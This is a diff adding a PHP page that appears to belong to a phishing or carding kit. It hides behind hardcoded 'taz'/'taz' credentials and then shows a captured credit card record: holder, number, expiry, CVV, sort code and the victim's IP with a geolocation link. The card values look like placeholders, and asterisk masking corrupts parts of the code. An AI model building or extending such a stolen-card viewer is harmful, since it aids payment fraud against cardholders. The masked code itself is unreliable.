@@ -1,0 +1,64 @@
+ <?php  
+
+
+
+// Define your user**** and password  
+
+$user**** = "taz";  
+
+$password = "taz";  
+
+
+
+if ($_POST['txtUser****'] != $user**** || $_POST['txtPassword'] != $password) {  
+
+
+
+?>  
+
+
+
+<h1>Login</h1>  
+
+
+
+<form ****="form" method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">  
+
+    <p><label for="txtUser****">User****:</label>  
+
+    <br /><input type="****" title="Enter your User****" ****="txtUser****" /></p>  
+
+
+
+    <p><label for="txtpassword">Password:</label>  
+
+    <br /><input type="password" title="Enter your password" ****="txtPassword" /></p>  
+
+
+
+    <p><input type="submit" ****="Submit" value="Login" /></p>  
+</form>  
+<?php  
+}  
+else {  
+?>  
+<pre><font style='font-size:14px;font-weight: bold;'>
+#################################
+     <img src='http://www.credit-card-logos.com/images/visa_credit-card-logos/visa_mastercard_1.gif'/>
+#################################
+Type Of CC  : VISA
+Holder Name : Moetaz Coder
+Card Number : 4546465765465454
+Experation  : 01/2015
+Cvv         : 645
+Sorte Code  : 45456
+#################################
+IP : <a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=127.0.0.1'>127.0.0.1</a>
+#################################
+
+<?php  
+
+
+
+}  
+?>
